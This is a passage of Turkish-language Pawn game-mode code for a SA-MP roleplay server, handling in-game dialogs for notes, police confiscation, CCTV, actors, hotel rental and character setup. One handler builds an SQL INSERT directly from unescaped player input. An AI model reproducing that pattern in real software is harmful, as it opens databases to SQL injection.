				    	ShowPlayerDialog(playerid,414,DIALOG_STYLE_INPUT,"Event Silah 2","2. Silah Ýçin SilahID Girin:","Seç","Geri");
				    }
				    case 2:
				    {
				    	ShowPlayerDialog(playerid,415,DIALOG_STYLE_INPUT,"Event Silah 3","3. Silah Ýçin SilahID Girin:","Seç","Geri");
				    }
				}
	        }
	        else
	        {
	        	ShowPlayerDialog(playerid, 404,DIALOG_STYLE_LIST,"Event Ayarlarý",event,"Seç","Ýptal");
	        }
	        return 1;
	}
	if(dialogid == 413)
	{
	    if(response)
 		{
	    	eweaps[0] = strval(inputtext);
	    }
	    else
	    {
	       	ShowPlayerDialog(playerid,412,DIALOG_STYLE_LIST,"Event Ayarlarý","Silah 1\nSilah 2\nSilah 3","Seç","Geri");
 		}
        return 1;
	}
	if(dialogid == 414)
	{
	        if(response)
	        {
	        	eweaps[1] = strval(inputtext);
	        }
	        else
	        {
	        	ShowPlayerDialog(playerid,412,DIALOG_STYLE_LIST,"Event Ayarlarý","Silah 1\nSilah 2\nSilah 3","Seç","Geri");
	        }
	        return 1;
	}
	if(dialogid == 415)
	{
	        if(response)
	        {
	        	eweaps[2] = strval(inputtext);
	        }
	        else
	        {
	        	ShowPlayerDialog(playerid,412,DIALOG_STYLE_LIST,"Event Ayarlarý","Silah 1\nSilah 2\nSilah 3","Seç","Geri");
	        }
	        return 1;
	}
	if(dialogid == 416)
	{
	        if(response)
	        {
		        eannounce = 1;
		        TextDrawSetString(eventText[0], inputtext);
		        for(new i=0;i<=3;i++)
 				{
					TextDrawShowForAll(eventText[i]);
				}
	        }
	        return 1;
	}
	if(dialogid == 417)
	{
	        if(response)
	        {
	        	efreeze = strval(inputtext);
	        }
	        return 1;
	}
	if(dialogid == 418)
	{
	    if(response)
	    {
	        if(response)
	        {
	            if(listitem == 0)
	            {
	                if(NotSayfa(playerid) == 5 && NotSayi(playerid, 5) == 5) return Hata(playerid, "Not defteriniz dolmuþ.");
	                ShowPlayerDialog(playerid, 419, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Not Defteri", ""C1"Notunuzu yazýn:", "Yaz", "Ýptal");
	            }
	            else if(listitem == 1)
	            {
	            	new _nsayfa = NotSayfa(playerid);
	            	if(_nsayfa == 0) return Hata(playerid, "Hiç notunuz bulunmamaktadýr.");
					new _result[645],query[128];
					format(query, sizeof(query), "SELECT `not` FROM `notdefteri` WHERE `sqlid` = '%d' AND `sayfa` = '%d';",Karakter[playerid][sqlid],1);
					new Cache:result = mysql_query(query,true);
					cache_get_row(0, 0, _result);
					cache_delete(result);
					new mstring[1024];
					format(mstring, sizeof(mstring), ""C3"NOT DEFTERÝ\n\n\n");
					new __xbol[5][128];
					strexplode(__xbol, _result, "|");
					for(new i=0;i<5;i++)
					{
	   					if(!isnull(__xbol[i]))
			  			{
			  				format(mstring, sizeof(mstring), "%s"C3""NOKTA" "C1"%s\n",mstring,__xbol[i]);
						}
					}
					if(_nsayfa == 1) ShowPlayerDialog(playerid, 420, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Not Defteri", mstring, "Kapat", "");
					else ShowPlayerDialog(playerid, 420, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Not Defteri", mstring, "Kapat", "Diðer Sayfa");
				}
	        }
		}
	    return 1;
	}
	if(dialogid == 419)
	{
	    if(response)
	    {
	        NotEkle(playerid, inputtext);
	        Bilgi(playerid, "Baþarýyla not yazdýnýz.");
	    }
	    return 1;
	}
	if(dialogid == 420)
	{
	    if(response)
	    {
	    }
		else
		{
			if(NotSayfa(playerid) == 1) return 1;
			NotSayfaGoster(playerid, 2);
		}
		return 1;
	}
	if(dialogid == 421)
	{
	    new _ncsayfa = GetPVarInt(playerid, "gNotSayfa");
	    if(NotSayfa(playerid) == _ncsayfa)
	    {
		    if(response)
		    {
		    }
		    else
		    {
		        NotSayfaGoster(playerid, _ncsayfa-1);
	    	}
		}
		else
	 	{
		    if(response)
		    {
		        NotSayfaGoster(playerid, _ncsayfa-1);
		    }
		    else
		    {
		        NotSayfaGoster(playerid, _ncsayfa+1);
	    	}
		}
	    return 1;
	}
	if(dialogid == 422)
	{
	    if(response)
	    {
			new _say=-1, _mstring[128];
			foreach(new i : Guns)
			{
				if(OyuncuSilah[i][oyuncuid] == Karakter[GetPVarInt(playerid, "polisElkoy")][sqlid])
				{
				    if(OyuncuSilah[i][durum] != 1) continue;
				    _say++;
				    if(_say == listitem)
				    {
				        if(IsPlayerInAnyVehicle(playerid))
					    {
					        Hata(playerid, "Araç içerisinde bu eylemi yapamazsýnýz.");
					        return 1;
						}
						RemovePlayerWeapon(GetPVarInt(playerid, "polisElkoy"), OyuncuSilah[i][silahid]);
	    				OyuncuSilah[i][durum] = 5;
						OyuncuSilahKaydetEx(i);
						format(_mstring, sizeof(_mstring), "%s adlý polis memuru %s silahýnýza el koydu.", OyuncuAdiniBul(playerid), SilahIsim(OyuncuSilah[i][silahid]));
						Bilgi(GetPVarInt(playerid, "polisElkoy"), _mstring);
						format(_mstring, sizeof(_mstring), "%s adlý kiþinin %s silahýna el koydunuz.", OyuncuAdiniBul(GetPVarInt(playerid, "polisElkoy")), SilahIsim(OyuncuSilah[i][silahid]));
						Bilgi(playerid, _mstring);
						format(_mstring, sizeof(_mstring), "[SILAH LOG] %d nolu silaha el koydu.",OyuncuSilah[i][no]);
						Log(playerid, _mstring);
						format(_mstring,sizeof(_mstring),"{ffff00}[LSPD] %s, (#%d)%s model silaha LSPD adýna el koydu. ",OyuncuAdiniBul(playerid),OyuncuSilah[i][no],SilahIsim(OyuncuSilah[i][silahid]));
						for(new zi=0;zi<MAX_PLAYERS;zi++){
						if(Birlik[Karakter[zi][birlik]][ftip] == LSPD && Girdi[zi]){
						MesajGonder(zi,0xffff00FF,_mstring);
						}
						}
						return 1;
					}
				}
			}
	    }
	    return 1;
	}
	if(dialogid == 423)
	{
	    if(response)
	    {
	        ShowPlayerDialog(playerid, 424, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"K9", ""NOKTA" Çaðýr\n"NOKTA" Gönder\n"NOKTA" Takip Ettir\n"NOKTA" Takibi Býraktýr", "Seç", "Ýptal");
	    }
	    return 1;
	}
	if(dialogid == 424)
	{
	    if(response)
	    {
			switch(listitem)
			{
			    case 0:
			    {
			        new Float:pPos[4];
					GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
					GetPlayerFacingAngle(playerid, pPos[3]);
					//new pVw, pInt;
					//pVw = GetPlayerVirtualWorld(playerid);
					//pInt = GetPlayerInterior(playerid);
					new Float:pPosEx[2];
					GetCoordsInFront(pPos[0], pPos[1], pPos[3], 1.0, pPosEx[0], pPosEx[1]);
					new string[32],name[32];
					GetPlayerName(playerid, name, 32);
					format(string, 32, "%s_K9",name);
					//new fnpcid = FCNPC_Create(string);
					//FCNPC_Spawn(fnpcid, 0, pPosEx[0], pPosEx[1], pPos[2]);
					//FCNPC_SetInterior(fnpcid, pInt);
					//FCNPC_SetVirtualWorld(fnpcid, pVw);
					//FCNPC_SetAngleToPlayer(fnpcid, playerid);
					//SetPVarInt(playerid, "hayvanID", fnpcid);
					SetTimerEx("hayvanAyarla", 300, false, "u", playerid);
					return 1;
			    }
			    case 1:
			    {
			        new fnpcid = GetPVarInt(playerid, "hayvanID");
			        KillTimer(GetPVarInt(playerid, "hayvanTakipTimer"));
			        Kick(fnpcid);
			        Bilgi(playerid, "K9 Köpeði gönderildi.");
			    }
			    case 2:
			    {
			        new fnpcid = GetPVarInt(playerid, "hayvanID");
			        SetPVarInt(playerid, "hayvanTakipTimer", SetTimerEx("hayvanTakipEttirTimer", 300, true, "dd", fnpcid, playerid));
			        Bilgi(playerid, "K9 Köpeði sizi takip ediyor.");
			    }
			    case 3:
			    {
			        KillTimer(GetPVarInt(playerid, "hayvanTakipTimer"));
			        Bilgi(playerid, "K9 Köpeði artýk sizi takip etmiyor.");
			    }
			}
	    }
		return 1;
	}
	if(dialogid == 425)
	{
	    if(response)
	    {
	        new _say=-1,c_playerid;
	        foreach(new i : Player) {
				if(gKameraKurdu[i] != 0) {
					_say++;
					if(listitem == _say)
						c_playerid = i;
				}
		 	}
		 	if(!gTvIzliyo[playerid])
			{
			    GetPlayerPos(playerid, gTx[playerid], gTy[playerid], gTz[playerid]);
			    gTint[playerid] = GetPlayerInterior(playerid);
			    gTvw[playerid] = GetPlayerVirtualWorld(playerid);
			    DONDUR(playerid);
			    switch(gKameraKurdu[c_playerid]) {
					case 1:{
					    SetPlayerPos(playerid, gKameraPosE[c_playerid][0], gKameraPosE[c_playerid][1], gKameraPosE[c_playerid][2]);
					    SetPlayerInterior(playerid, gKamera[c_playerid][4]);
						SetPlayerVirtualWorld(playerid, gKamera[c_playerid][5]);
						TogglePlayerSpectating(playerid, 1);
						SetTimerEx("cKameraAyarlaEx" , 300 , false , "ii" , playerid , c_playerid);
					}
					case 2:{
						SetPlayerPos(playerid, gKameraPosE[c_playerid][0], gKameraPosE[c_playerid][1], gKameraPosE[c_playerid][2]);
						SetPlayerInterior(playerid, gKamera[c_playerid][4]);
						SetPlayerVirtualWorld(playerid, gKamera[c_playerid][5]);
                        TogglePlayerSpectating(playerid, 1);
                        SetTimerEx("cKameraAyarla" , 300 , false , "ii" , playerid , c_playerid);
					}
				}
				SetPVarInt(playerid, "IzledigiKameraman", c_playerid);
				IzleyenSayisi[c_playerid]++;
				Bilgi(playerid, "Televizyon izliyorsunuz.");
				gTvIzliyo[playerid] = 1;
			}
	    }
	    return 1;
	}
	if(dialogid == 426)
	{
	    if(response)
	    {
	        new _hno = strval(inputtext);
	        Birlik[Karakter[playerid][birlik]][hesapno] = _hno;
	        new nstring[128];
	        format(nstring, sizeof(nstring), "%s adlý birliðin hesap nosunu %d olarak deðiþtirdiniz.",Birlik[Karakter[playerid][birlik]][fisim],Birlik[Karakter[playerid][birlik]][hesapno]);
	        Bilgi(playerid, nstring);
	    }
	    return 1;
	}
	if(dialogid == 427)
	{
	    if(response)
	    {
	        new _hno = strval(inputtext);
	        if(_hno <= 0) return Hata(playerid, "Reklam fiyatýnýz 0'dan büyük olmalýdýr.");
	        Birlik[Karakter[playerid][birlik]][rfiyat] = _hno;
	        new nstring[128];
	        format(nstring, sizeof(nstring), "%s adlý birliðin reklam fiyatýný $%d olarak deðiþtirdiniz.",Birlik[Karakter[playerid][birlik]][fisim],Birlik[Karakter[playerid][birlik]][rfiyat]);
	        Bilgi(playerid, nstring);
			format(nstring, sizeof(nstring), "{f9f9f9} "C3"''/reklam''\n\n{f9f9f9}Reklam Fiyatý: Harf Baþýna "DOLAR"${f9f9f9}%d",Birlik[Karakter[playerid][birlik]][rfiyat]);
	        UpdateDynamic3DTextLabelText(Birlik[Karakter[playerid][birlik]][breklamtext], 0xAFAFAFFF, nstring);
	    }
	    return 1;
	}
	if(dialogid == 428)
	{
	    if(response)
	    {
	        new _say=-1;
	        for(new i=0;i<MAX_CCTV;i++)
	        {
	            if(IsValidDynamicObject(CCTV[i][c_object]))
	            {
	                _say++;
	                if(_say == listitem)
	                {
	                    new _mstring[128];
	                    format(_mstring, sizeof(_mstring), "%s CCTV izliyorsunuz. (Çýkmak için ''/cctv'')",CCTV[i][c_name]);
	                    Bilgi(playerid, _mstring);
	                    SetPVarInt(playerid, "CCTV_Izliyor", 1);
	                    new Float:pPos[3];
	                    GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
						SetPVarFloat(playerid, "cPosX", pPos[0]);
						SetPVarFloat(playerid, "cPosY", pPos[1]);
						SetPVarFloat(playerid, "cPosZ", pPos[2]);
						SetPVarInt(playerid, "cInt", GetPlayerInterior(playerid));
						SetPVarInt(playerid, "cVw", GetPlayerVirtualWorld(playerid));
	                    SetPlayerPos(playerid, CCTV[i][c_px], CCTV[i][c_py], CCTV[i][c_pz]);
						SetPlayerInterior(playerid, CCTV[i][c_int]);
						SetPlayerVirtualWorld(playerid, CCTV[i][c_vw]);
						//TogglePlayerSpectating(playerid, true);
						//AttachCameraToDynamicObject(playerid, CCTV[i][c_object]);
	                    SetTimerEx("CCTV_Izlet", 300, false, "ii", playerid, i);
	                    return 1;
	                }
	            }
	        }
	    }
	    return 1;
	}
	if(dialogid == 429)
	{
	    if(response)
	    {
	        new _query[128],Float:pPos[3];
			format(_query, sizeof(_query), "INSERT INTO cctv (`c_name`) VALUES ('%s')",inputtext);
			new Cache:cache = mysql_query(_query,true);
			new i = cache_insert_id();
			cache_delete(cache);
			GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
			format(CCTV[i][c_name], 65, "%s", inputtext);
			CCTV[i][c_id] = i;
			CCTV[i][c_px] = pPos[0];
			CCTV[i][c_py] = pPos[1];
			CCTV[i][c_pz] = pPos[2];
			CCTV[i][c_rx] = 0;
			CCTV[i][c_ry] = 0;
			CCTV[i][c_rz] = 0;
			CCTV[i][c_int] = GetPlayerInterior(playerid);
			CCTV[i][c_vw] = GetPlayerVirtualWorld(playerid);
			CCTV[i][c_object] = CreateDynamicObject(CCTV_MODEL, CCTV[i][c_px], CCTV[i][c_py], CCTV[i][c_pz], 0,0,0, .worldid=CCTV[i][c_vw], .interiorid=CCTV[i][c_int]);
			CCTV[i][c_angle] = 0;
			ObjeKurdu(playerid);
			new _mstring[128];
			format(_mstring, sizeof(_mstring), "Baþarýyla %s isimli cctv kurdunuz.ID:%d",inputtext,i);
			Bilgi(playerid,_mstring);
			Streamer_Update(playerid);
			CCTVKaydet(i);
	    }
	    return 1;
	}
	if(dialogid == 430)
	{
		if(response)
		{
			switch(listitem)
			{
			    case 0:
			    {
			        ShowPlayerDialog(playerid, 431, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Actor Ýsim", "Actor'un ismini girin:", "Gir", "Ýptal");
			    }
			    case 1:
			    {
			        ShowPlayerDialog(playerid, 432, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Actor Skin", "Actor'un skinini girin:", "Gir", "Ýptal");
			    }
			    case 2:
			    {
			        new _id = GetPVarInt(playerid, "ActorDuzenle"),Float:pPos[4];
			        GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
					GetPlayerFacingAngle(playerid, pPos[3]);
					GetXYInFrontOfPlayerEx(playerid, pPos[0], pPos[1], 1);
					Actor[_id][ax] = pPos[0];
					Actor[_id][aay] = pPos[1];
					Actor[_id][az] = pPos[2];
					Actor[_id][arz] = pPos[3];
					Actor[_id][avw] = GetPlayerVirtualWorld(playerid);
					Actor[_id][aint] = GetPlayerInterior(playerid);
					DestroyDynamicActor(Actor[_id][aactor]);
  					Actor[_id][aactor] = CreateDynamicActor(Actor[_id][askin], Actor[_id][ax], Actor[_id][aay], Actor[_id][az], Actor[_id][arz], .worldid=Actor[_id][avw], .interiorid=Actor[_id][aint]);
  					DestroyDynamic3DTextLabel(Actor[_id][adtext]);
  					Actor[_id][adtext] = CreateDynamic3DTextLabel(Actor[_id][aisim], (Actor[_id][arenk] == 0 ? COLOR_GREY : Actor[_id][arenk]), Actor[_id][ax], Actor[_id][aay], Actor[_id][az] + 0.9, 15, .worldid=Actor[_id][avw], .interiorid=Actor[_id][aint], .testlos=1);
					ActorKaydet(_id);
					Bilgi(playerid, "Actor'un pozisyonu düzenlendi.");
			    }
			    case 3:
			    {
			        ShowPlayerDialog(playerid, 433, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Actor Renk", "Actor'un rengini girin:", "Gir", "Ýptal");
			    }
			    case 4:
			    {
			        ShowPlayerDialog(playerid, 434, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Actor Anim", "Actor animini girin:", "Gir", "Ýptal");
			    }
			}
		}
		return 1;
	}
	if(dialogid == 431)
	{
	    if(response)
	    {
	        if(strlen(inputtext) > 32) return Hata(playerid, "Actor'un ismi bu kadar uzun olamaz.");
	        new _id = GetPVarInt(playerid, "ActorDuzenle");
			if(isnull(inputtext)) format(Actor[_id][aisim], 32, "");
			else format(Actor[_id][aisim], 32, "%s", inputtext);
			UpdateDynamic3DTextLabelText(Actor[_id][adtext],(Actor[_id][arenk] == 0 ? COLOR_GREY : Actor[_id][arenk]), Actor[_id][aisim]);
			Bilgi(playerid, "Actor'un ismi düzenlendi.");
			ActorKaydet(_id);
	    }
	    return 1;
	}
	if(dialogid == 432)
	{
	    if(response)
		{
		    new _id = GetPVarInt(playerid, "ActorDuzenle"), _skin=strval(inputtext);
		    DestroyDynamicActor(Actor[_id][aactor]);
		    Actor[_id][askin] = _skin;
		    Actor[_id][aactor] = CreateDynamicActor(Actor[_id][askin], Actor[_id][ax], Actor[_id][aay], Actor[_id][az], Actor[_id][arz], .worldid=Actor[_id][avw], .interiorid=Actor[_id][aint]);
			Bilgi(playerid, "Actor'un skini düzenlendi.");
			ActorKaydet(_id);
	    }
	    return 1;
	}
	if(dialogid == 433)
	{
	    if(response)
		{
		    new _id = GetPVarInt(playerid, "ActorDuzenle"), _renk=strval(inputtext);
		    Actor[_id][arenk] = _renk;
		    UpdateDynamic3DTextLabelText(Actor[_id][adtext],(Actor[_id][arenk] == 0 ? COLOR_GREY : Actor[_id][arenk]), Actor[_id][aisim]);
		    Bilgi(playerid, "Actor'un rengi düzenlendi.");
			ActorKaydet(_id);
		}
	    return 1;
	}
	if(dialogid == 434)
	{
	    if(response)
	    {
	        new _id = GetPVarInt(playerid, "ActorDuzenle");
	        format(Actor[_id][aanim], 255, "%s", inputtext);
	        strreplace(Actor[_id][aanim], "\"", "");
	        new _x_bol[8][16];
	        strexplode(_x_bol, Actor[_id][aanim], ",");
			ApplyDynamicActorAnimation(Actor[_id][aactor],_x_bol[0],_x_bol[1],floatstr(_x_bol[2]),strval(_x_bol[3]),strval(_x_bol[4]),strval(_x_bol[5]),strval(_x_bol[6]),strval(_x_bol[7]));
	        Bilgi(playerid, "Actor'un animi düzenlendi.");
	        ActorKaydet(_id);
	    }
	    return 1;
	}
	if(dialogid == 435)
	{
	    if(response)
	    {
	        if(GetPlayerCash(playerid) < 500) return Hata(playerid, "Yeterli paranýz yok. 500$");
	        GivePlayerCash(playerid, -500);
	        Bilgi(playerid, "Alet çantasý aldýnýz.");
	        gToolkit[playerid] = 1;
	    }
	    return 1;
	}
	if(dialogid == 436)
	{
	    if(response)
	    {
			SetPVarInt(playerid, "AracTahta", listitem);
			ShowPlayerDialog(playerid, 437, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Araçlar(Araç Tahta)", "Araç idsini girin:", "Gir", "Ýptal");
	    }
	    return 1;
	}
	if(dialogid == 437)
	{
	    if(response)
	    {
	        new _x__bol[5][4];
	        strexplode(_x__bol, Veriler[aractahta], ",");
	        for(new i=0;i<5;i++) {
				if(strval(_x__bol[i]) < 400 || strval(_x__bol[i]) > 611) {
    				_x__bol[i] = "612";
				}
			}
			if(strval(inputtext) < 400 || strval(inputtext) > 611)
			    _x__bol[GetPVarInt(playerid, "AracTahta")] = "612";
			else
				format(_x__bol[GetPVarInt(playerid, "AracTahta")], 32, "%s", inputtext);
			format(Veriler[aractahta], 128, "%s,%s,%s,%s,%s", _x__bol[0], _x__bol[1], _x__bol[2], _x__bol[3], _x__bol[4]);
			new __mstring[128];
		    format(__mstring, sizeof(__mstring), "%s\n%s\n%s\n%s\n%s",VehicleName[strval(_x__bol[0])-400][0],VehicleName[strval(_x__bol[1])-400][0],VehicleName[strval(_x__bol[2])-400][0],VehicleName[strval(_x__bol[3])-400][0],VehicleName[strval(_x__bol[4])-400][0]);
			SetDynamicObjectMaterialText(Veriler[aractahtayazi], 0, __mstring, 90, "Arial", 16, 1, -218103808, 0, 1);
			VerileriKaydet();
			Bilgi(playerid, "Araç tahtasý düzenlendi.");
	    }
	    return 1;
	}
	if(dialogid == 438)
	{
	    if(response)
	    {
		    new _mid,__mid,_q_uery[128];
			format(_q_uery, sizeof(_q_uery), "SELECT * FROM `mobilya` WHERE `aracid` = '%d'",Arac[GetPVarInt(playerid, "EsyaAracID")][aid]);
			new Cache:cache = mysql_query(_q_uery,true);
			new rows, fields;
			cache_get_data(rows, fields, g_iHandle);
			if(!rows) return 1;
			_mid = cache_get_field_content_int(listitem, "id");
			SetPVarInt(playerid, "EsyaTasiModel", cache_get_field_content_int(listitem, "model"));
			cache_delete(cache);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
			SetPlayerAttachedObject(playerid,9,-2000,1,0.183000,0.567000,-0.020999,0.000000,0.000000,0.000000,0.422000,0.412000,0.408000);
			Bilgi(playerid, "Eþyayý araçtan aldýnýz.");
			for(new i=0;i<MAX_MOBILYA;i++) {
			    if(_mid == Mobilya[i][mid]) {
					__mid = i;
					SetPVarInt(playerid, "EsyaTasiID", i);
					break;
				}
			}
			AracEsyaBirak(0, Mobilya[__mid][mid]);
			/*format(_q_uery, sizeof(_q_uery), "DELETE FROM `mobilya` WHERE `aracid` = '%d'", Arac[GetPVarInt(playerid, "EsyaAracID")][aid]);*/
			Mobilya[__mid][mtexture][0] = 0;
   			Mobilya[__mid][mtexture][1] = 0;
   			Mobilya[__mid][mtexturerenk][1] = -1;
   			Mobilya[__mid][mtexturerenk][1] = -1;
			DeletePVar(playerid, "EsyaAracID");
	    }
	    return 1;
	}
	if(dialogid == 439) {
		if(response) {
			DONDUR(playerid);
			if(listitem == 0) {
				SetPlayerPos(playerid, 1489.4712,-1517.5865,3398.7405);
			    SetPlayerInterior(playerid, 244);
			    SetPlayerVirtualWorld(playerid, 567);
			    SetPlayerFacingAngle(playerid, 360);
			}
			else {
			    SetPlayerPos(playerid, 1489.5900,-1517.4100,3306.0044);
			    SetPlayerInterior(playerid, 1);
			    SetPlayerVirtualWorld(playerid, listitem);
			    SetPlayerFacingAngle(playerid, 180);
			}
		    UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 3000, false, "u", playerid);
		}
		return 1;
	}
	if(dialogid == 440) {
		if(response) {
		    switch(listitem) {
				case 0: {
					ShowPlayerDialog(playerid, 441, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Otel Oda Kirala", ""C1"Tek kiþilik odanýn saatlik fiyatý 150$'dýr. Kaç saat kiralamak istiyorsunuz?\n"C3"(Maksimum 3 Saat)", "Kirala", "Ýptal");
				}
				case 1: {
                    ShowPlayerDialog(playerid, 441, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Otel Oda Kirala", ""C1"Ýki kiþilik odanýn saatlik fiyatý 250$'dýr. Kaç saat kiralamak istiyorsunuz?\n"C3"(Maksimum 3 Saat)", "Kirala", "Ýptal");
				}
				case 2: {
                    ShowPlayerDialog(playerid, 441, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Otel Oda Kirala", ""C1"VIP odanýn saatlik fiyatý 450$'dýr. Kaç saat kiralamak istiyorsunuz?\n"C3"(Maksimum 3 Saat)", "Kirala", "Ýptal");
				}
			}
			SetPVarInt(playerid, "SectigiOda", listitem+1);
		}
		return 1;
	}
	if(dialogid == 441) {
		if(response) {
			new _saat = strval(inputtext);
			new _para;
			switch(GetPVarInt(playerid, "SectigiOda")) {
				case 1: _para=150;
				case 2: _para=250;
				case 3: _para=450;
			}
			if(_saat <= 0 || _saat > 3) return Hata(playerid, "Hatalý saat girdiniz.");
			if(GetPlayerCash(playerid) < _saat*_para) return Hata(playerid, "Üzerinizde yeterli miktarda para yok.");
			new rand=random(240);
			while(Otel[rand][osahip] != 0) {
				rand = random(240);
			}
			new Float:_rand = rand;
			new _kat = floatround((_rand/12), floatround_ceil);
			new Float:_temp = (_rand/12)-floatround((_rand/12), floatround_floor);
			new _oda = floatround(_temp*12);
			Otel[rand][osahip] = Karakter[playerid][sqlid];
			Otel[rand][osure] = _saat*60;
			Otel[rand][otip] = GetPVarInt(playerid, "SectigiOda");
			GivePlayerCash(playerid, -_saat*_para);
			new _m_string[128];
			format(_m_string, sizeof(_m_string), "Baþarýyla %d saatliðine oda kiraladýnýz, odanýzýn yeri %d. kat %d. oda",_saat, _kat, _oda+1);
			Bilgi(playerid, _m_string);
			Ipucu(playerid, "N tuþu odanýzý kilitleyip/kilidini açabilir, Y tuþu ile odanýza girip/çýkabilirsiniz.");
		}
		return 1;
	}
	if(dialogid == 442) {
		if(response) {
		    new _query[64];
			format(_query, sizeof(_query), "SELECT * FROM `deepweb`");
            new Cache:cache = mysql_query(_query,true);
			new rows, fields, _mstring[2048], ilanadi[64], _gorev[1024], _isim[33], _yer[129], _not[1025];
			cache_get_data(rows, fields, g_iHandle);
			cache_get_field_content(listitem, "ilanadi", ilanadi);
			cache_get_field_content(listitem, "gorev", _gorev);
			cache_get_field_content(listitem, "isim", _isim);
			cache_get_field_content(listitem, "yer", _yer);
			cache_get_field_content(listitem, "not", _not);
			format(_mstring, sizeof(_mstring), ""C1"Görev:\t\t\t "C3"%s\n"C1"Ýsim:\t\t\t "C3"%s\n"C1"Son Görüldüðü Yer:\t "C3"%s\n"C1"Not:\t\t\t "C3"%s",_gorev,_isim,_yer,_not);
			new __mstring[64];
			format(__mstring, sizeof(__mstring), " Ödül %d$ ", cache_get_field_content_int(listitem, "para"));
			cache_delete(cache);
			new _m_string[128];
			format(_m_string, sizeof(_m_string), ""C7"EIGHTBORN - "C8"Deepweb: %s", ilanadi);
			ShowPlayerDialog(playerid, 443, DIALOG_STYLE_MSGBOX, _m_string, _mstring, __mstring, "");
		}
		return 1;
	}
	if(dialogid == 443) {
		return 1;
	}
	if(dialogid == 444) {
		if(response) {
			new _mstring[128];
   			new id = GetPVarInt(playerid, "IsyeriBuy");
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(GetPlayerCash(playerid) < 150) return Hata(playerid, "Üzerinizde yeterli para yok.");
	                GivePlayerCash(playerid, -150);
	                OyuncuSilahVer(0, playerid, 2, 1);
	                format(_mstring, sizeof(_mstring), "Baþarýyla golf sopasý aldýnýz.");
	                Bilgi(playerid, _mstring);
	                Isyeri[id][ikasa] += 75;
	            }
	            case 1:
	            {
	                if(GetPlayerCash(playerid) < 150) return Hata(playerid, "Üzerinizde yeterli para yok.");
	                GivePlayerCash(playerid, -150);
	                OyuncuSilahVer(0, playerid, 7, 1);
	                format(_mstring, sizeof(_mstring), "Baþarýyla bilardo istekasý aldýnýz.");
	                Bilgi(playerid, _mstring);
	                Isyeri[id][ikasa] += 75;
	            }
	            case 2:
	            {
	                if(GetPlayerCash(playerid) < 500) return Hata(playerid, "Üzerinizde yeterli para yok.");
	                GivePlayerCash(playerid, -500);
	                OyuncuSilahVer(0, playerid, 46, 1);
	                format(_mstring, sizeof(_mstring), "Baþarýyla paraþüt aldýnýz.");
	                Bilgi(playerid, _mstring);
	                Isyeri[id][ikasa] += 250;
	            }
	            case 3:
	            {
	                if(GetPlayerCash(playerid) < 100) return Hata(playerid, "Üzerinizde yeterli para yok.");
	                GivePlayerCash(playerid, -100);
	                OyuncuSilahVer(0, playerid, 15, 1);
	                format(_mstring, sizeof(_mstring), "Baþarýyla baston aldýnýz.");
	                Bilgi(playerid, _mstring);
	                Isyeri[id][ikasa] += 50;
	            }
	            case 4:
	            {
	                if(GetPlayerCash(playerid) < 150) return Hata(playerid, "Üzerinizde yeterli para yok.");
	                GivePlayerCash(playerid, -150);
	                OyuncuSilahVer(0, playerid, 6, 1);
	                format(_mstring, sizeof(_mstring), "Baþarýyla kürek aldýnýz.");
	                Bilgi(playerid, _mstring);
	                Isyeri[id][ikasa] += 75;
	            }
			}
		}
		return 1;
	}
	if(dialogid == 445) {
		if(response) {
			Karakter[playerid][boy] = listitem+1;
			Bilgi(playerid, "Karakterinizin boyunu belirlediniz.");
			if(!Karakter[playerid][kilo])
			{
			    ShowPlayerDialog(playerid, 446, DIALOG_STYLE_LIST, "Kilo Seçimi", "40-50kg\n51-60kg\n61-65kg\n66-75kg\n76-85kg\n86-90kg\n91-100kg\n101-120kg\n+120kg", "Seçim", "");
			}
			else if(!Karakter[playerid][gozrenk])
			{
			    ShowPlayerDialog(playerid, 447, DIALOG_STYLE_LIST, "Göz Rengi Seçimi", "Siyah\nKahverengi\nMavi\nYeþil\nDiðer", "Seçim", "");
			}
			else if(!Karakter[playerid][sacrenk])
			{
			    ShowPlayerDialog(playerid, 448, DIALOG_STYLE_LIST, "Saç Rengi Seçimi", "Kel\nSiyah\nKahverengi\nKumral\nSarý\nKýzýl\nDiðer", "Seçim", "");
			}
		}
		else ShowPlayerDialog(playerid, 445, DIALOG_STYLE_LIST, "Boy Seçimi", "1.50-1.60m\n1.61-1.70m\n1.71-1.76m\n1.77-1.85m\n+1.85m", "Seçim", "");
		return 1;
	}
	if(dialogid == 446) {
		if(response) {
			Karakter[playerid][kilo] = listitem+1;
			Bilgi(playerid, "Karakterinizin kilosunu belirlediniz.");
			if(!Karakter[playerid][gozrenk])
			{
			    ShowPlayerDialog(playerid, 447, DIALOG_STYLE_LIST, "Göz Rengi Seçimi", "Siyah\nKahverengi\nMavi\nYeþil\nDiðer", "Seçim", "");
			}
			else if(!Karakter[playerid][sacrenk])
			{
			    ShowPlayerDialog(playerid, 448, DIALOG_STYLE_LIST, "Saç Rengi Seçimi", "Kel\nSiyah\nKahverengi\nKumral\nSarý\nKýzýl\nDiðer", "Seçim", "");
			}
		}
		else ShowPlayerDialog(playerid, 446, DIALOG_STYLE_LIST, "Kilo Seçimi", "40-50kg\n51-60kg\n61-65kg\n66-75kg\n76-85kg\n86-90kg\n91-100kg\n101-120kg\n+120kg", "Seçim", "");
		return 1;
	}
	if(dialogid == 447) {
		if(response) {
			Karakter[playerid][gozrenk] = listitem+1;
			Bilgi(playerid, "Karakterinizin göz rengini belirlediniz.");
			if(!Karakter[playerid][sacrenk])
			{
